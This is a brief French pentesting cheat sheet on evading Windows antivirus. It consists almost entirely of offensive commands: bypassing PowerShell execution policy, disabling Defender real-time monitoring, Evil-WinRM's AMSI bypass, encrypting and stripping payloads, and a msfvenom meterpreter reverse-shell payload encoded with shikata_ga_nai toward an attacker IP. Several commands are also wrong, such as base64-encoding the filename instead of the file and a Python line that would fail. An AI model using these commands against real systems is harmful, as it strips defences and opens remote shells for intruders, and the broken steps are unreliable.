
# Powershell

```powershell
powershell -ep bypass
Set-MpPreference -DisableRealtimeMonitoring $true
```

# Evil-Winrm

```bash
# winrm
menu
Bypass-4MSI
```

# Générer un payload encodé en Base64

```bash
echo -n "payload.exe" | base64 > payload.b64
```

## Chiffrer un binaire

```bash
openssl enc -aes-256-cbc -salt -in payload.exe -out payload_enc.exe -k secret
```

# Changer la signature binaire

```bash
mv payload.exe payload.bak && cp payload.bak payload.exe
strip --strip-debug payload.exe
```

# Obfuscation avec msfvenom

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attaquant_ip> LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > payload.exe
```

# Injection shellcode avec Python

```bash
python3 -c 'import sys; shellcode = "\x90\x90..."; sys.stdout.buffer.write(shellcode)'
```